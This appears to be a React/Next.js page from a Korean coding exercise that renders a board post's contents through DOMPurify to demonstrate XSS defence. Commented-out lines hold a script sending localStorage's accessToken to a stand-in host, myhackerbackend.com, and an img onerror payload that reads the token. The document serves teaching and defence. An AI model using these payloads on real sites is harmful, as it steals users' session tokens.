import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import DOMPurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutedPage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.id },
  });

  return (
    <div>
      {/* <div>{router.query.qqq}번 게시글로 이동이 완료되었습니다.</div> */}
      <div style={{ color: "red" }}>작성자: {data?.fetchBoard.writer}</div>
      <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
            <script>
                const qqq = localStorage.getItem("accessToken")
                axios.post("http://myhackerbackend.com/mydata", { data: qqq })
            </script>
          `,
        }}
      ></div> */}
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      ) : (
        <div style={{ color: "blue" }}></div>
      )}
      <div style={{ color: "brown" }}>주소: 구로구</div>
    </div>
  );
}

// playground XSS 공격
// <img src='#' onerror='console.log(localStorage.getItem(\"accessToken\"))' />
